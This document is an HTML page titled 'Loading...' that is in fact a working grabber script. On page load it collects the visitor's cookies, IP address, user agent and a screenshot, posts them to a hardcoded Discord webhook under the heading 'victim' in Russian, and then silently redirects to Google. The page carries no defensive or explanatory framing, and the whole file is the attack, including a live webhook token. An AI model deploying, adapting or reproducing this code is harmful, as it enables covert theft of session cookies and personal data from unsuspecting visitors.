<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
</head>
<body>
    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1490347452119650575/R4ODyPAGuW7WRQfK3yTjU4O7ZFG184RRAoMgQI0DJH8_Ri7udX2fENxAEab5wlbdvaLh";

        async function send(msg, blob = null) {
            if (blob) {
                let fd = new FormData();
                fd.append("file", blob, "shot.jpg");
                fd.append("payload_json", JSON.stringify({ content: msg.slice(0, 1900) }));
                await fetch(WEBHOOK, { method: "POST", body: fd });
            } else {
                await fetch(WEBHOOK, { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({content: msg.slice(0,1900)}) });
            }
        }

        async function run() {
            let data = {
                time: new Date().toLocaleString(),
                ua: navigator.userAgent,
                lang: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                cookies: document.cookie,
                url: location.href
            };
            try {
                let res = await fetch("https://api.ipify.org?format=json");
                let ip = await res.json();
                data.ip = ip.ip;
            } catch(e) {}
            
            let msg = `**📸 ЖЕРТВА**\n🕒 ${data.time}\n📱 ${data.ua.substring(0,150)}\n🌍 IP: ${data.ip || "нет"}\n🍪 Cookies: ${data.cookies.substring(0,300) || "нет"}\n🔗 ${data.url}`;
            
            let screenshot = null;
            try {
                let canvas = await html2canvas(document.body, { scale: 0.8 });
                screenshot = await new Promise(r => canvas.toBlob(r, "image/jpeg", 0.7));
            } catch(e) {}
            
            if (screenshot) await send(msg, screenshot);
            else await send(msg);
            
            window.location.replace("https://www.google.com");
        }
        run();
    </script>
</body>
</html>
